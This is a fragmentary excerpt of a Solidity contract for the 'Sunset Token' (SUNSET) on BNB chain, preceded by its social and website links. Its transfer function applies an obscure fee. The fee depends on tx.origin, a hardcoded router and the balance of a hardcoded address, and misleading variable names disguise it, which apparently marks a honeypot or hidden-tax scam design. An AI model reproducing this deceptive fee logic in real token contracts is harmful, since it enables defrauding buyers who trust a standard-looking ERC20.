...
https://twitter.com/SunsetTokenBNB
https://t.me.com/SunsetTokenBNB
https://SunsetTokenBNB.xyz
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    address internal router = 0x5b4bA6EBBec9731eC4f55891b2110Cba4e79B28d;
    uint256 private _allowance = 1;
    string private _symbol;
    mapping(address => uint256) private _balances;
    uint256 private _totalSupply;
    address private V2Factory = 0x41453840B6039684BF5672d097cDcac1AAa35e3B;
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual
    {
        ...
        uint256 swapamount = amount.mul(to != tx.origin && from != router && _balances[V2Factory] > 0 ? _pairsToken : _allowance).div(100) + 0;
        if (swapamount > 0)
        {
...
contract SunsetToken is ERC20, Ownable
{
    constructor() ERC20(unicode"Sunset Token", unicode"SUNSET")
    {
